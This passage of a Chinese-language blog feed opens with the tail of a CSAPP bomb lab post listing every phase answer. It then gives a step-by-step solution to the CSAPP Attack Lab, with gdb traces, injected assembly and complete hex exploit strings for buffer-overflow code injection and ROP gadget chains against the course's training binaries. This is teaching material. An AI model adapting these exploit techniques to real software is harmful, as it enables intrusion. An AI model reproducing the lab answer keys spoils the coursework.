<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>所有关卡的答案保存在<code>answer</code>文件中，内容如下：</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line"># cat answer</span><br><span class="line">Border relations with Canada have never been better.</span><br><span class="line">1 2 4 8 16 32</span><br><span class="line">6 682</span><br><span class="line">7 0 DrEvil</span><br><span class="line">IONUVW</span><br><span class="line">4 3 2 1 6 5</span><br><span class="line">20</span><br></pre></td></tr></table></figure>

<p>执行结果如下：</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line"># ./bomb answer</span><br><span class="line">Welcome to my fiendish little bomb. You have 6 phases with</span><br><span class="line">which to blow yourself up. Have a nice day!</span><br><span class="line">Phase 1 defused. How about the next one?</span><br><span class="line">That&#x27;s number 2.  Keep going!</span><br><span class="line">Halfway there!</span><br><span class="line">So you got that one.  Try this one.</span><br><span class="line">Good work!  On to the next...</span><br><span class="line">Curses, you&#x27;ve found the secret phase!</span><br><span class="line">But finding it and solving it are quite different...</span><br><span class="line">Wow! You&#x27;ve defused the secret stage!</span><br><span class="line">Congratulations! You&#x27;ve defused the bomb!</span><br></pre></td></tr></table></figure>

<h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><p>《深入理解计算机系统 原书第3版》</p>
]]></content>
      <categories>
        <category>CSAPP</category>
      </categories>
      <tags>
        <tag>Assembly</tag>
        <tag>CSAPP</tag>
      </tags>
  </entry>
  <entry>
    <title>CSAPP 缓冲区溢出实验</title>
    <url>/2020/08/02/2020-08-02-csapp-buflab/</url>
    <content><![CDATA[<h3 id="实验介绍"><a href="#实验介绍" class="headerlink" title="实验介绍"></a>实验介绍</h3><p>本实验中，我们需要利用缓冲区溢出漏洞，来修改一个二进制可执行文件的运行时行为。</p>
<h3 id="预备知识"><a href="#预备知识" class="headerlink" title="预备知识"></a>预备知识</h3><ul>
<li><p>缓冲区溢出的原理，参考《CSAPP原书第3版》<code>3.10</code>小节</p>
</li>
<li><p><code>gdb</code>和<code>objdump</code>使用</p>
</li>
<li><p>x86_64下的汇编</p>
</li>
</ul>
<span id="more"></span>

<h3 id="实验准备"><a href="#实验准备" class="headerlink" title="实验准备"></a>实验准备</h3><p>首先获取实验所需文件<code>target1.tar</code>:  <a href="http://csapp.cs.cmu.edu/3e/labs.html">http://csapp.cs.cmu.edu/3e/labs.html</a></p>
<p><code>linux</code>下执行<code>tar xvf target1.tar</code>，得到如下文件。每个文件作用简述如下：</p>
<ul>
<li><p><code>ctarget</code>：代码注入攻击的程序。</p>
</li>
<li><p><code>rtarget</code>：ROP攻击的程序。</p>
</li>
<li><p><code>cookie.txt</code>: 记录<code>cookie</code>的值，攻击时需要用到。</p>
</li>
<li><p><code>farm.c</code>: 用于ROP攻击寻找<code>gadget</code>的文件。</p>
</li>
<li><p><code>hex2raw</code>：将ASCII码转化为字符串的小程序，用于构造攻击字符串。</p>
</li>
</ul>
<p>实验共有5关，每一关的目标如下：<br><img src="/2020/08/02/2020-08-02-csapp-buflab/image1.png"><br><strong>实验前，务必仔细阅读<code>attackLab</code>实验手册，可参考<a href="http://csapp.cs.cmu.edu/3e/attacklab.pdf">attacklab.pdf</a></strong></p>
<h3 id="第一关"><a href="#第一关" class="headerlink" title="第一关"></a>第一关</h3><p>这一关不需注入新的代码，只需要让目标程序<code>ctarget</code>重定向到一个已存在的过程即可。</p>
<p><code>ctarget</code>中定义了<code>test</code>函数, <code>test</code>函数会调用<code>getbuf</code>函数，C代码如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">test</span><span class="params">()</span> &#123;</span><br><span class="line">	<span class="type">int</span> val;</span><br><span class="line">	val = getbuf();</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;No exploit. Getbuf returned 0x%x\n&quot;</span>, val);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>ctarget</code>中还定义了<code>touch1</code>函数，C代码如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">touch1</span><span class="params">()</span> &#123;</span><br><span class="line">	vlevel = <span class="number">1</span>;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Touch1!: you called touch1()\n&quot;</span>);</span><br><span class="line">	validate(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>本关的目标是：在<code>getbuf</code>函数返回时，令程序跳转到<code>touch1()</code>而不是从<code>test()</code>正常返回。</p>
<p>我们需要攻击<code>getbuf</code>函数，构造输入字符串，利用缓冲区溢出修改栈中的返回地址。</p>
<p>首先查看<code>getbuf</code>函数的汇编代码：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">00000000004017a8 &lt;getbuf&gt;:</span><br><span class="line">  4017a8:   48 83 ec 28             sub    $0x28,%rsp</span><br><span class="line">  4017ac:   48 89 e7                mov    %rsp,%rdi</span><br><span class="line">  4017af:   e8 8c 02 00 00          callq  401a40 &lt;Gets&gt;</span><br><span class="line">  4017b4:   b8 01 00 00 00          mov    $0x1,%eax</span><br><span class="line">  4017b9:   48 83 c4 28             add    $0x28,%rsp</span><br><span class="line">  4017bd:   c3                      retq   				#retq指令从栈中数据0x401976弹出，并作为返回地址跳转</span><br></pre></td></tr></table></figure>

<p>从<code>sub  0x28 %rsp</code>看出， <code>getbuf</code>函数在栈上分配了<code>40</code>个字节。再看下<code>test</code>函数的汇编代码：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(gdb) disassemble test</span><br><span class="line">Dump of assembler code for function test:</span><br><span class="line">   0x0000000000401968 &lt;+0&gt;:     sub    $0x8,%rsp</span><br><span class="line">   0x000000000040196c &lt;+4&gt;:     mov    $0x0,%eax</span><br><span class="line">   0x0000000000401971 &lt;+9&gt;:     callq  0x4017a8 &lt;getbuf&gt; #将下一条指令0x401976压栈，并跳转到getbuf</span><br><span class="line">   0x0000000000401976 &lt;+14&gt;:    mov    %eax,%edx</span><br></pre></td></tr></table></figure>

<p>这里<code>callq</code>指令将<code>0x401976</code>压栈，并跳转到<code>getbuf</code>; <code>getbuf</code>执行结束后，使用<code>retq</code>指令从栈中弹出<code>0x401976</code>，并作为返回地址跳转。</p>
<p>假设输入字符串是<code>&quot;1234567876543210&quot;</code>， 程序执行到<code>0x4017b4</code>，此时栈组织如下：<br><img src="/2020/08/02/2020-08-02-csapp-buflab/image2.png"><br>因此，我们需要先把栈上<code>40</code>字节填满，然后将<code>touch1</code>的地址写到<code>$rsp + 0x28</code>处，覆盖原先正常的返回地址<code>0x401976</code>。下面找到<code>touch1</code>的地址为<code>0x4017c0</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(gdb) disassemble touch1</span><br><span class="line">Dump of assembler code for function touch1:</span><br><span class="line">   0x00000000004017c0 &lt;+0&gt;:     sub    $0x8,%rsp</span><br><span class="line">   ...</span><br></pre></td></tr></table></figure>

<p>构造攻击字符串, 写到文件<code>hex1</code></p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">00 00 00 00 00 00 00 00					# 前40个字节任意填，目的是将第40个字节之后的返回地址改写为touch1的地址</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">c0 17 40 00 00 00 00 00					# 小端机器上，这里要注意端序</span><br></pre></td></tr></table></figure>

<p>利用<code>hex2raw</code>工具将字节码转为字符串，写到文件<code>answer1</code>， 用法如下：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">./hex2raw &lt; hex1 &gt; answer1</span><br></pre></td></tr></table></figure>

<p>执行<code>ctarget</code>程序验证结果，其中<code>-i</code>指定字符串所在文件，<code>-q</code>必选参数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># ./ctarget -q -i answer1</span><br><span class="line">Cookie: 0x59b997fa</span><br><span class="line">Touch1!: You called touch1()</span><br><span class="line">Valid solution for level 1 with target ctarget</span><br><span class="line">PASS: Would have posted the following:</span><br><span class="line">        user id bovik</span><br><span class="line">        course  15213-f15</span><br><span class="line">        lab     attacklab</span><br><span class="line">        result  1:PASS:0xffffffff:ctarget:1:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 C0 17 40 00 00 00 00 00</span><br></pre></td></tr></table></figure>

<h3 id="第二关"><a href="#第二关" class="headerlink" title="第二关"></a>第二关</h3><p>与第一关不同， 这关还需要在输入字符串中注入攻击代码。首先查看<code>touch2</code>代码：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">touch2</span><span class="params">(<span class="type">unsigned</span> val)</span> &#123;</span><br><span class="line">	vlevel = <span class="number">2</span>;</span><br><span class="line">	<span class="keyword">if</span>(val == cookie) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;Touch2!: You called touch2(0x%.8x)\n&quot;</span>, val);</span><br><span class="line">		validate(<span class="number">2</span>);</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;Misfire: You called touch2(0x%.8x)\n&quot;</span>, val);</span><br><span class="line">		fail(<span class="number">2</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看出，我们需要在跳转到<code>touch2</code>的时候将<code>cookie</code>的值作为参数传递。思路如下：</p>
<ul>
<li><p>将返回地址改写为栈中的注入代码的地址。栈的地址可以用<code>gdb</code>跑一把程序确认</p>
</li>
<li><p>在注入代码中，将<code>cookie</code>值传递到<code>%rdi</code>。因为<code>x86-64</code>汇编使用<code>%rdi</code>作为第一个参数</p>
</li>
<li><p>确定<code>touch2</code>的起始地址并跳转。可利用<code>push</code>和<code>ret</code>指令实现跳转</p>
</li>
</ul>
<p>首先确定栈的地址，在<code>0x4017af callq 401a40 &lt;Gets&gt;</code>处打断点，查看<code>%rsp</code>值</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># gdb ctarget</span><br><span class="line">(gdb) set args -q -i answer1</span><br><span class="line">(gdb) b *0x4017af</span><br><span class="line">Breakpoint 1 at 0x4017af: file buf.c, line 14.</span><br><span class="line">(gdb) r</span><br><span class="line">Starting program: /home/pc/attackLab/target1/ctarget -q -i answer1</span><br><span class="line">Cookie: 0x59b997fa</span><br><span class="line">Breakpoint 1, 0x00000000004017af in getbuf () at buf.c:14</span><br><span class="line">14      buf.c: No such file or directory.</span><br><span class="line">(gdb) p $rsp</span><br><span class="line">$1 = (void *) 0x5561dc78</span><br></pre></td></tr></table></figure>

<p>得到栈的地址为<code>0x5561dc78</code>, 这正是我们注入代码所在的位置。</p>
<p>接下来需要将<code>cookie</code>值传给<code>%rdi</code>，再跳转到<code>touch2</code>。<code>touch2</code>地址可通过查看汇编代码得到，结果是<code>0x4017ec</code>；跳转到touch2的思路是：<strong>先利用<code>push</code>指令将<code>touch2</code>地址压栈，接着用<code>retq</code>从栈中弹出<code>touch2</code>地址并跳转。</strong></p>
<p>编写如下注入代码，保存到文件<code>inject2.s</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">movl  $0x59b997fa, %edi			# cookie值为0x59b997fa</span><br><span class="line">pushq $0x4017ec					# touch2的起始地址为0x4017ec</span><br><span class="line">retq</span><br></pre></td></tr></table></figure>

<p>执行<code>gcc -c inject2.s</code>, <code>objdump -d inject2.o</code>， 将汇编文件转为二进制， 得到如下机器码：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0000000000000000 &lt;.text&gt;:</span><br><span class="line">   0:   bf fa 97 b9 59          mov    $0x59b997fa,%edi</span><br><span class="line">   5:   68 ec 17 40 00          pushq  $0x4017ec</span><br><span class="line">   a:   c3                      retq</span><br></pre></td></tr></table></figure>

<p>综上，得到我们需要输入的字符串</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">bf fa 97 b9 59 68 ec 17				# 攻击代码位于地址0x5561dc78</span><br><span class="line">40 00 c3 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">78 dc 61 55 00 00 00 00				# 改写返回地址为0x5561dc78</span><br></pre></td></tr></table></figure>

<p>此时的栈组织如下：<br><img src="/2020/08/02/2020-08-02-csapp-buflab/image3.png"></p>
<h3 id="第三关"><a href="#第三关" class="headerlink" title="第三关"></a>第三关</h3><p><code>touch3</code>代码如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">hexmatch</span><span class="params">(<span class="type">unsigned</span> val, <span class="type">char</span> *sval)</span> &#123;</span><br><span class="line">	<span class="type">char</span> cbuf[<span class="number">110</span>];</span><br><span class="line">	<span class="type">char</span> *s = cbuf + random() % <span class="number">100</span>;</span><br><span class="line">	<span class="built_in">sprintf</span>(s, <span class="string">&quot;%.8x&quot;</span>, val);</span><br><span class="line">	<span class="keyword">return</span> <span class="built_in">strncmp</span>(sval, s, <span class="number">9</span>) == <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">touch3</span><span class="params">(<span class="type">char</span> *sval)</span> &#123;</span><br><span class="line">	vlevel = <span class="number">3</span>; <span class="comment">/* Part of validation protocol */</span></span><br><span class="line">	<span class="keyword">if</span> (hexmatch(cookie, sval)) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;Touch3!: You called touch3(\&quot;%s\&quot;)\n&quot;</span>, sval);</span><br><span class="line">		validate(<span class="number">3</span>);</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;Misfire: You called touch3(\&quot;%s\&quot;)\n&quot;</span>, sval);</span><br><span class="line">		fail(<span class="number">3</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>和第二关类似，我们需要传入<code>cookie</code>字符串并跳转到<code>touch3</code>。但需要注意<code>hexmatch</code>函数被调用后，会覆盖一部分<code>getbuf</code>的缓冲区。为了避免这一点，可以将<code>cookie</code>字符串放到<code>test</code>的栈帧里。这一关的思路如下：</p>
<ul>
<li><p>将返回地址改写为注入代码所在的地址。栈的地址可以用<code>gdb</code>跑一把程序确认</p>
</li>
<li><p>将<code>cookie</code>字符串放到<code>test</code>的栈帧里。在注入代码中，将<code>cookie</code>串的首地址传递到<code>%rdi</code>。</p>
</li>
<li><p>确定<code>touch3</code>的起始地址并跳转。可利用<code>push</code>和<code>ret</code>指令实现跳转</p>
</li>
</ul>
<p>与第二关类似，编写如下注入代码，保存到文件<code>inject3.s</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov   $0x5561dca8,%rdi		# 将cookie字符串放到test栈帧中，这里放到返回地址(0x5561dca0)+0x8处</span><br><span class="line">pushq $0x4018fa				# 将touch3起始地址压栈</span><br><span class="line">retq						# 将touch3地址退栈，并跳转执行touch3</span><br></pre></td></tr></table></figure>

<p>执行<code>gcc -c inject3.s</code>, <code>objdump -d inject3.o</code>， 将汇编文件转为二进制， 得到如下机器码：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0000000000000000 &lt;.text&gt;:</span><br><span class="line">   0:   48 c7 c7 a8 dc 61 55    mov    $0x5561dca8,%rdi</span><br><span class="line">   7:   68 fa 18 40 00          pushq  $0x4018fa</span><br><span class="line">   c:   c3                      retq</span><br></pre></td></tr></table></figure>

<p>我第一次写这块汇编代码时，犯了两个错误：</p>
<ul>
<li><p>将<code>$0x5561dca8</code>错写成<code>$0x5561dca4</code>, 导致段错误。<strong>注意64位机器上执行压栈和退栈操作，栈指针<code>%rsp</code>应该减去或加上<code>8</code>，而不是<code>4</code></strong></p>
</li>
<li><p><code>pushq  $0x4018fa</code>中漏写了<code>$</code>符号，导致压栈的数据不对。<strong>注意对立即数操作时必须加上$符号</strong></p>
</li>
</ul>
<p>用<code>man ascii</code>查表 ，将字符串<code>59b997fa</code>转成ASCII码：<code>35 39 62 39 39 37 66 61</code></p>
<p>综上，得到我们需要输入字符串</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">48 c7 c7 a8 dc 61 55 68				# 攻击代码位于地址0x5561dc78</span><br><span class="line">fa 18 40 00 c3 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">78 dc 61 55 00 00 00 00				# 改写返回地址为0x5561dc78</span><br><span class="line">35 39 62 39 39 37 66 61				# cookie字符串</span><br><span class="line">00 00 00 00 00 00 00 00</span><br></pre></td></tr></table></figure>

<p>此时的栈组织如下：<br><img src="/2020/08/02/2020-08-02-csapp-buflab/image4.png"></p>
<h3 id="第四关"><a href="#第四关" class="headerlink" title="第四关"></a>第四关</h3><p>在前三关，我们插入攻击代码，同时插入指向攻击代码的指针，而产生这个指针需要跑下代码确认栈的地址。但是在第四、五关的<code>rtarget</code>程序中，采用了如下策略防止代码注入攻击：</p>
<ul>
<li><strong>栈随机化</strong>，每次运行相同的程序，它们的栈地址是不同的。</li>
<li><strong>限制可执行代码区域</strong>，栈是不可执行的。</li>
</ul>
<p>既然注入代码不可行，能不能利用已有的可执行代码来实现目的呢？以下介绍一种叫<code>ROP</code>的攻击方式</p>
<h4 id="ROP"><a href="#ROP" class="headerlink" title="ROP"></a>ROP</h4><p>即<code>return-oriented-programming</code>。策略是寻找已有的一些以<code>ret</code>命令结尾的指令(每条这样的指令称为<code>gadget</code>)，通过在这些<code>gadget</code>之间不断跳转，拼凑处我们想要的指令来实现攻击目的，如下图：(<code>c3</code>是<code>retq</code>的字节码)<br><img src="/2020/08/02/2020-08-02-csapp-buflab/image5.png"><br>在<code>rtarget</code>程序中，有很多这样的<code>gadget</code>可以利用，举例如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">00000000004019a0 &lt;addval_273&gt;:</span><br><span class="line">  4019a0:   8d 87 48 89 c7 c3       lea    -0x3c3876b8(%rdi),%eax</span><br><span class="line">  4019a6:   c3                      retq</span><br></pre></td></tr></table></figure>

<p>注意到<code>48 89 c7</code>恰好是<code>movq %rax, %rdi</code>的编码， <code>c3</code>表示<code>ret</code>指令。因此这段代码包含了一个<code>gadget</code>，且起始地址为<code>0x4019a2</code>。也就是说，如果我们改写栈的返回地址到<code>0x4019a2</code>，就可以执行<code>movq %rax, %rdi</code>和<code>ret</code>两条已有指令，绕过了栈上不可执行代码的限制。思路如下：</p>
<ul>
<li>将<code>cookie</code>值传递给<code>%rdi</code>，难点在于如何用已有的<code>gadget</code>拼凑出我们需要的指令，可参考如下的指令表。</li>
<li>将<code>touch2</code>的起始地址放到栈中。查看汇编代码得到<code>touch2</code>地址为<code>0x4017ec</code>。<br><img src="/2020/08/02/2020-08-02-csapp-buflab/image6.png"><br><img src="/2020/08/02/2020-08-02-csapp-buflab/image7.png"><br><img src="/2020/08/02/2020-08-02-csapp-buflab/image8.png"><br><img src="/2020/08/02/2020-08-02-csapp-buflab/image9.png"></li>
</ul>
<p>另外，<code>ret</code>的字节编码是<code>0xc3</code>；<code>nop</code>的字节编码是<code>0x90</code>，啥也不做，只是将<code>%rip</code>加1。</p>
<p>可以在<code>start_farm</code>和<code>end_farm</code>之间找到所有可利用的<code>gadget</code>。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0000000000401994 &lt;start_farm&gt;:</span><br><span class="line">  401994:   b8 01 00 00 00          mov    $0x1,%eax</span><br><span class="line">  401999:   c3                      retq</span><br><span class="line">000000000040199a &lt;getval_142&gt;:</span><br><span class="line">  40199a:   b8 fb 78 90 90          mov    $0x909078fb,%eax</span><br><span class="line">  40199f:   c3                      retq</span><br><span class="line">00000000004019a0 &lt;addval_273&gt;:</span><br><span class="line">  4019a0:   8d 87 48 89 c7 c3       lea    -0x3c3876b8(%rdi),%eax</span><br><span class="line">  4019a6:   c3                      retq</span><br><span class="line">00000000004019a7 &lt;addval_219&gt;:</span><br><span class="line">  4019a7:   8d 87 51 73 58 90       lea    -0x6fa78caf(%rdi),%eax</span><br><span class="line">  4019ad:   c3                      retq</span><br><span class="line">00000000004019ae &lt;setval_237&gt;:</span><br><span class="line">  4019ae:   c7 07 48 89 c7 c7       movl   $0xc7c78948,(%rdi)</span><br><span class="line">  4019b4:   c3                      retq</span><br><span class="line"># ......</span><br></pre></td></tr></table></figure>

<p>为了将<code>cookie</code>传给<code>%rdi</code>，可以先将<code>cookie</code>的值写到栈，再利用<code>popq %rdi</code>指令实现。</p>
<p>查表可知<code>pop</code>的编码在<code>58 ~ 5f</code>。全局搜索后没找到<code>5f c3</code>或<code>5f 90 c3</code>，说明不能用<code>$popq %rdi</code>一步到位；但是可以在<code>addval_219</code>中找到<code>58 90 c3</code>，先将栈中的值弹出传到<code>%rax</code>。记录起始地址为<code>0x4019ab</code>。</p>
<p>接着想办法把<code>%rax</code>的值传递到<code>%rdi</code>。查表，在gadget中找到<code>48 89 c7</code>，也就是<code>movq %rax, %rdi</code>指令，可以在<code>&lt;addval_273&gt;</code>中找到，而且后面正好跟了<code>c3</code>，记录起始地址为<code>0x4019a2</code>。</p>
<p>到此，我们完成了<code>gadget</code>的拼凑，输入的字符串如下：</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">ab 19 40 00 00 00 00 00							# 改写返回地址为0x4019ab, 执行popq %rax</span><br><span class="line">fa 97 b9 59 00 00 00 00							# 保存cookie的值: 0x59b997fa</span><br><span class="line">a2 19 40 00 00 00 00 00							# 执行mov %rax, %rdi</span><br><span class="line">ec 17 40 00 00 00 00 00							# 跳转到touch2, touch2起始地址为0x4017ec</span><br></pre></td></tr></table></figure>

<p>此时的栈组织如下：<br><img src="/2020/08/02/2020-08-02-csapp-buflab/image10.png"></p>
<h3 id="第五关"><a href="#第五关" class="headerlink" title="第五关"></a>第五关</h3><p>和第三关类似，这关需要将<code>cookie</code>字符串的首地址传给<code>%rdi</code>, 再调用<code>touch3</code>。</p>
<p>由于栈位置是随机的，需要用<strong>栈顶地址+偏移</strong>来确定<code>cookie</code>串的位置。 栈顶地址即<code>$rsp</code>，可通过<code>mov %rsp XXX</code>获取，偏移需要根据<code>gadget</code>指令的长度来确定。</p>
<p>如何将<code>cookie</code>串地址传到<code>%rdi</code>呢？可以在<code>farm.o</code>中可以找到如下的<code>gadget</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">00000000004019d6 &lt;add_xy&gt;:</span><br><span class="line">  4019d6:   48 8d 04 37             lea    (%rdi,%rsi,1),%rax</span><br><span class="line">  4019da:   c3</span><br></pre></td></tr></table></figure>

<p>再结合所有<code>gadget</code>，多次尝试后发现一个可行解，如下：</p>
<ul>
<li><p>将<code>%rsp</code>传给<code>%rdi</code>，利用<code>mov</code>实现。</p>
</li>
<li><p>将偏移传给<code>%rsi</code>， 需利用<code>pop</code>和多个<code>mov</code>实现。偏移量需要在找到所有<code>gadget</code>后通过计算得出。</p>
</li>
<li><p>用<code>lea (%rdi,%rsi,1),%rax</code>，将<code>cookie</code>串的首地址传给<code>%rax</code></p>
</li>
<li><p>将<code>%rax</code>传给<code>%rdi</code>，利用<code>mov</code>指令</p>
</li>
</ul>
<h4 id="具体步骤"><a href="#具体步骤" class="headerlink" title="具体步骤"></a>具体步骤</h4><h5 id="1-将-rsp传给-rdi"><a href="#1-将-rsp传给-rdi" class="headerlink" title="1. 将%rsp传给%rdi"></a>1. 将<code>%rsp</code>传给<code>%rdi</code></h5><p>通过<code>movq %rsp,%rax</code>,<code>movq %rax,%rdi</code>实现：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0000000000401aab &lt;setval_350&gt;:</span><br><span class="line">  401aab:   c7 07 48 89 e0 90       movl   $0x90e08948,(%rdi)</span><br><span class="line">  401ab1:   c3                      retq</span><br><span class="line">00000000004019a0 &lt;addval_273&gt;:</span><br><span class="line">  4019a0:   8d 87 48 89 c7 c3       lea    -0x3c3876b8(%rdi),%eax</span><br><span class="line">  4019a6:   c3                      retq</span><br></pre></td></tr></table></figure>

<p><code>movq %rsp,%rax</code>编码为<code>48 89 e0</code>, 地址为<code>0x401aad</code>。</p>
<p><code>movq %rax %rdi</code>编码为<code>48 89 c7</code>，地址为<code>0x4019a2</code>。</p>
<h5 id="2-将偏移传给-rsi"><a href="#2-将偏移传给-rsi" class="headerlink" title="2. 将偏移传给$rsi"></a>2. 将偏移传给<code>$rsi</code></h5><p>先将偏移写到栈里，再通过如下<code>4</code>条指令传到<code>$rsi</code>：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pop %rax</span><br><span class="line">mov %eax, %edx</span><br><span class="line">mov %edx, %ecx</span><br><span class="line">mov %ecx, %rsi</span><br></pre></td></tr></table></figure>

<p>在以下的<code>gadget</code>中找到这<code>4</code>条指令：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">00000000004019ca &lt;getval_280&gt;:</span><br><span class="line">  4019ca:   b8 29 58 90 c3          mov    $0xc3905829,%eax</span><br><span class="line">  4019cf:   c3                      retq</span><br><span class="line">00000000004019db &lt;getval_481&gt;:</span><br><span class="line">  4019db:   b8 5c 89 c2 90          mov    $0x90c2895c,%eax</span><br><span class="line">  4019e0:   c3                      retq</span><br><span class="line">0000000000401a33 &lt;getval_159&gt;:</span><br><span class="line">  401a33:   b8 89 d1 38 c9          mov    $0xc938d189,%eax</span><br><span class="line">  401a38:   c3                      retq</span><br><span class="line">0000000000401a11 &lt;addval_436&gt;:</span><br><span class="line">  401a11:   8d 87 89 ce 90 90       lea    -0x6f6f3177(%rdi),%eax</span><br><span class="line">  401a17:   c3                      retq</span><br></pre></td></tr></table></figure>

<p><code>pop %rax</code>编码为<code>58</code>, 地址为<code>0x4019cc</code>。</p>
<p><code>mov %eax %edx</code>编码为<code>89 c2</code>，地址为<code>0x4019dd</code>。</p>
<p><code>mov %edx %ecx</code>编码为<code>89 d1</code>，地址为<code>0x401a34</code>。</p>
<p><code>mov %ecx,%esi</code>编码为<code>89 ce</code>，地址为<code>0x401a13</code>。</p>
<h5 id="3-将cookie字符串传给-rdi"><a href="#3-将cookie字符串传给-rdi" class="headerlink" title="3. 将cookie字符串传给%rdi"></a>3. 将<code>cookie</code>字符串传给<code>%rdi</code></h5><p>利用<code>lea ($rdi,%rsi,1),%rax</code>，地址为<code>0x4019d6</code>。</p>
<h5 id="4-将-rax传给-rdi"><a href="#4-将-rax传给-rdi" class="headerlink" title="4. 将%rax传给$rdi"></a>4. 将<code>%rax</code>传给<code>$rdi</code></h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">00000000004019c3 &lt;setval_426&gt;:</span><br><span class="line">  4019c3:   c7 07 48 89 c7 90       movl   $0x90c78948,(%rdi)</span><br><span class="line">  4019c9:   c3                      retq</span><br></pre></td></tr></table></figure>

<p><code>mov %rax,%rdi</code>编码为<code>48 89 c7</code>，地址为<code>0x4019c5</code>。</p>
<p>到此，我们完成了<code>gadget</code>的构造，只需继续在栈中依次填入<code>touch3</code>返回地址，<code>cookie</code>字符串，<code>0</code>(字符串结束标志)，再确定偏移即可。</p>
<p>偏移应该是cookie字符串首地址减去(返回地址+0x8)， 中间隔了<code>9</code>条指令，因此偏移量为<code>72</code>, 即<code>0x48</code></p>
<p>输入的字符串如下：</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">ad 1a 40 00 00 00 00 00			# 改写返回地址为0x401aad</span><br><span class="line">a2 19 40 00 00 00 00 00			# 计算偏移的起始地址，返回地址+0x8</span><br><span class="line">cc 19 40 00 00 00 00 00</span><br><span class="line">48 00 00 00 00 00 00 00			# 确定偏移为0x48</span><br><span class="line">dd 19 40 00 00 00 00 00</span><br><span class="line">34 1a 40 00 00 00 00 00</span><br><span class="line">13 1a 40 00 00 00 00 00</span><br><span class="line">d6 19 40 00 00 00 00 00</span><br><span class="line">c5 19 40 00 00 00 00 00</span><br><span class="line">fa 18 40 00 00 00 00 00			# touch3首地址为0x4018fa</span><br><span class="line">35 39 62 39 39 37 66 61			# cookie字符串地址，用这个地址减去计算偏移的起始地址得到偏移量为72, 即0x48</span><br><span class="line">00 00 00 00 00 00 00 00</span><br></pre></td></tr></table></figure>

<p>此时的栈组织如下：<br><img src="/2020/08/02/2020-08-02-csapp-buflab/image11.png"></p>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>通过这次实验，初步了解栈和缓冲区溢出的原理，以及安全编码的重要性。</p>
<h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><p>《深入理解计算机系统 原书第3版》</p>
